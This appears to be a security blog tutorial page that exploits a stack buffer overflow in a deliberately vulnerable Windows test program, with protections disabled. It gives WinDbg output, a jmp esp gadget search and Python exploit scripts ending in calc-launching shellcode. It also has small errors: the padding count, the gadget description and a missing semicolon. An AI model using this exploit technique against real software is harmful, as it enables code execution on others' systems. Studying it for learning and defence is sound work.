@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  	<meta charset="utf-8">
+  	<title>Dimitri Fourny | How to detect and exploit a buffer overflow</title>
+  	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+  	<meta name="description" content="Passionate security researcher.">
+  	<meta name="author" content="Dimitri Fourny">
+	
+	<link href="/assets/css/bootstrap.min.css" rel="stylesheet">
+    <link href="/assets/css/style.css" rel="stylesheet">
+  	<link href="/assets/css/syntax.css" rel="stylesheet">
+
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+  	<link rel="shortcut icon" href="/assets/img/favicon.png">
+</head>
+
+<body>
+	<div class="navbar navbar-default navbar-static-top" role="navigation">
+		<div class="container">
+			<div class="navbar-header">
+				<a class="navbar-brand" href="/">Dimitri Fourny</a>
+	          	<button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main">
+	            	<span class="icon-bar"></span>
+	            	<span class="icon-bar"></span>
+	            	<span class="icon-bar"></span>
+	          	</button>
+		    </div>
+
+		    <div class="navbar-collapse collapse" id="navbar-main">
+		      <ul class="nav navbar-nav navbar-right">
+                <li class="active"><a href="/">Home</a></li>
+		        <li><a href="https://twitter.com/DimitriFourny">Twitter</a></li>
+                <li><a href="https://github.com/DimitriFourny">GitHub</a></li>
+		        <li><a href="http://fr.linkedin.com/pub/dimitri-fourny/58/283/13a/">Linkedin</a></li>
+		      </ul>
+		    </div>
+		</div>
+	</div>
+
+	<div class="container">
+		
+		<div class="row">
+			<div class="col-sm-12">
+                <h1 id="how-to-detect-and-exploit-a-buffer-overflow">How to detect and exploit a buffer overflow</h1>
+<h2 id="introduction">Introduction</h2>
+
+<p>The buffer overflow is the most classical vulnerability, on Linux and on Windows.
+In this article, I will try to show you how to exploit a buffer overflow on 
+Windows with WinDbg and a little Python code.</p>
+
+<h2 id="etablishment">Etablishment</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+	<span class="kt">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+	<span class="n">getchar</span><span class="p">()</span>
+	<span class="n">strcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"argv[1]: %s"</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>If you want to compile it with Visual Studio, don’t forget to deactivate some 
+protections. Open <em>Project -&gt; Properties</em> and set:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Stack cookie: C/C++ -&gt; Code generation -&gt; Buffer Security Check = No
+    ASLR: Linker -&gt; Advanced -&gt; Randomized Base Address = No
+    DEP: Linker -&gt; Advanced -&gt; Data Execution Protection = No
+</code></pre></div></div>
+
+<p>And compile in <em>Release mode</em>.</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>We will test <code class="highlighter-rouge">argv[1]</code> entry:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span> 
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span><span class="s">'A'</span><span class="o">*</span><span class="mi">200</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>We start our Python script, WinDbg and we do File -&gt; Attach to a Process. 
+We continue the script execution and we get:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(598.11cc): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+41414141 ??              ???
+</code></pre></div></div>
+
+<p>Boom! We could control EIP!
+We check:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000:x86&gt; r
+eax=00000000 ebx=00000000 ecx=72e75617 edx=0008e3b8 esi=00000001 edi=00403378
+eip=41414141 esp=0018ff4c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+</code></pre></div></div>
+
+<p><em>0x41</em> is ‘A’ in ASCII code, so we can control the execution address and execute 
+our shellcode. We look at the stack to know how many ‘A’ we need to remove:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000:x86&gt; dd esp
+0018ff4c  41414141 41414141 41414141 41414141
+0018ff5c  41414141 41414141 41414141 41414141
+0018ff6c  41414141 41414141 41414141 41414141
+0018ff7c  41414141 41414141 41414141 41414141
+0018ff8c  41414141 41414141 41414141 41414141
+0018ff9c  41414141 41414141 41414141 00000000
+0018ffac  7efde000 00000000 00000000 00000000
+0018ffbc  0018ffa0 00000000 ffffffff 775470d5
+</code></pre></div></div>
+
+<p>We change our Python script and we test once again:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000:x86&gt; ? 0018ffac - 4 - 0018ff4c
+Evaluate expression: 92 = 0000005c
+</code></pre></div></div>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span> 
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span><span class="s">'A'</span><span class="o">*</span><span class="mi">104</span><span class="o">+</span><span class="s">'B'</span><span class="o">*</span><span class="mi">4</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>And execute it:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(e70.868): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+42424242 ??              ???
+</code></pre></div></div>
+
+<p>We need a 102 bytes padding, followed by the shellcode address and finally the
+shellcode. But we have a problem: the shellcode will contain a null byte.
+In fact, if we want to do that:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span> 
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="mi">104</span> <span class="c1"># NOP
+</span><span class="n">eip</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x4c\xff\x18\x00</span><span class="s">'</span> <span class="c1"># 0018ff4c
+</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">eip</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>We see that EIP wil contain a null byte and the shellcode will not work. So we 
+will use the technique of JMP ESP.</p>
+
+<h2 id="jmp-esp">JMP ESP</h2>
+
+<p>We need to find a JMP ESP with <em>findjmp2</em>.
+We dump the modules list:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ModLoad: 00000000`00400000 00000000`00405000   C:\Users\Dimitri\Desktop\bof.exe
+ModLoad: 00000000`772f0000 00000000`7749c000   C:\Windows\SYSTEM32\ntdll.dll
+ModLoad: 00000000`774d0000 00000000`77650000   ntdll.dll
+ModLoad: 00000000`74fd0000 00000000`7500f000   C:\Windows\SYSTEM32\wow64.dll
+ModLoad: 00000000`74f70000 00000000`74fcc000   C:\Windows\SYSTEM32\wow64win.dll
+ModLoad: 00000000`74f60000 00000000`74f68000   C:\Windows\SYSTEM32\wow64cpu.dll
+ModLoad: 00000000`75c10000 00000000`75d20000   KERNEL32.dll
+ModLoad: 00000000`76080000 00000000`760c7000   KERNELBASE.dll
+ModLoad: 00000000`73860000 00000000`7391f000   MSVCR100.dll
+ModLoad: 00000000`10000000 00000000`1005a000   guard32.dll
+ModLoad: 00000000`752d0000 00000000`753d0000   USER32.dll
+ModLoad: 00000000`75570000 00000000`75600000   GDI32.dll
+ModLoad: 00000000`75530000 00000000`7553a000   LPK.dll 
+ModLoad: 00000000`75630000 00000000`756cd000   USP10.dll
+ModLoad: 00000000`757c0000 00000000`7586c000   msvcrt.dll
+ModLoad: 00000000`77030000 00000000`770d0000   ADVAPI32.dll
+ModLoad: 00000000`752b0000 00000000`752c9000   SECHOST.dll
+ModLoad: 00000000`756d0000 00000000`757c0000   RPCRT4.dll
+ModLoad: 00000000`75030000 00000000`75090000   SspiCli.dll
+ModLoad: 00000000`75020000 00000000`7502c000   CRYPTBASE.dll
+ModLoad: 00000000`74f50000 00000000`74f59000   VERSION.dll
+ModLoad: 00000000`76f10000 00000000`76f70000   IMM32.dll
+ModLoad: 00000000`751e0000 00000000`752ac000   MSCTF.dll
+ModLoad: 00000000`74ee0000 00000000`74ee7000   FLTLIB.DLL
+</code></pre></div></div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Dimitri\Desktop&gt;findjmp.exe KERNEL32.dll esp
+
+Findjmp, Eeye, I2S-LaB
+Findjmp2, Hat-Squad
+Scanning KERNEL32.dll for code useable with the esp register
+0x75C32EA9      push esp - ret
+0x75C32EB1      push esp - ret
+0x75C32EB9      push esp - ret
+0x75C32EC1      push esp - ret
+0x75C32EC9      push esp - ret
+0x75C32ED1      push esp - ret
+0x75C32ED9      push esp - ret
+0x75C32EE1      push esp - ret
+0x75C32EE9      push esp - ret
+0x75C32EF1      push esp - ret
+0x75C3EF93      call esp
+0x75C40405      jmp esp
+0x75C493A3      call esp
+0x75C9D26F      call esp
+Finished Scanning KERNEL32.dll for code useable with the esp register
+Found 14 usable addresses
+</code></pre></div></div>
+
+<p>So we can choose a gadget and try:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span> 
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="mi">104</span>        <span class="c1"># NOP
+</span><span class="n">jmpESP</span> <span class="o">=</span> <span class="s">'</span><span class="se">\xA9\x2E\xC3\x75</span><span class="s">'</span> <span class="c1"># *75C32EA9 = jmp esp
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="s">'</span><span class="se">\xCC</span><span class="s">'</span><span class="o">*</span><span class="mi">4</span>        <span class="c1"># INT 3
+</span>
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">jmpESP</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:001&gt; g
+(1378.10f0): WOW64 breakpoint - code 4000001f (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+0018ff4c cc              int     3
+
+0:000:x86&gt; u
+0018ff4c cc              int     3
+0018ff4d cc              int     3
+0018ff4e cc              int     3
+0018ff4f cc              int     3
+0018ff50 002d5000501b    add     byte ptr ds:[1B500050h],ch
+0018ff56 50              push    eax
+0018ff57 00bd1cf87000    add     byte ptr [ebp+70F81Ch],bh
+0018ff5d 0000            add     byte ptr [eax],al
+</code></pre></div></div>
+
+<p>So we trigger the instruction <code class="highlighter-rouge">int 3</code>. Now we will try with a real shellcode to 
+pop a calc:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span> 
+
+<span class="n">padding</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="mi">104</span>        <span class="c1"># NOP
+</span><span class="n">jmpESP</span> <span class="o">=</span> <span class="s">'</span><span class="se">\xA9\x2E\xC3\x75</span><span class="s">'</span> <span class="c1"># *75C32EA9 = jmp esp
+</span>
+<span class="c1"># http://code.google.com/p/w32-exec-calc-shellcode/
+</span><span class="n">shellcode</span> <span class="o">=</span>	<span class="p">(</span><span class="s">"</span><span class="se">\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64\x8B\x72\x30</span><span class="s">"</span>
+			<span class="s">"</span><span class="se">\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B</span><span class="s">"</span>
+			<span class="s">"</span><span class="se">\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x0F</span><span class="s">"</span>
+			<span class="s">"</span><span class="se">\xB7\x2C\x51\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF1\x8B\x74</span><span class="s">"</span>
+			<span class="s">"</span><span class="se">\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7\xCC</span><span class="s">"</span><span class="p">);</span>
+
+<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">jmpESP</span> <span class="o">+</span><span class="s">'"'</span><span class="o">+</span><span class="n">shellcode</span><span class="o">+</span><span class="s">'"'</span><span class="p">);</span>
+</code></pre></div></div>
+
+			</div>
+		</div>
+
+    </div>
+
+</body>
+</html>
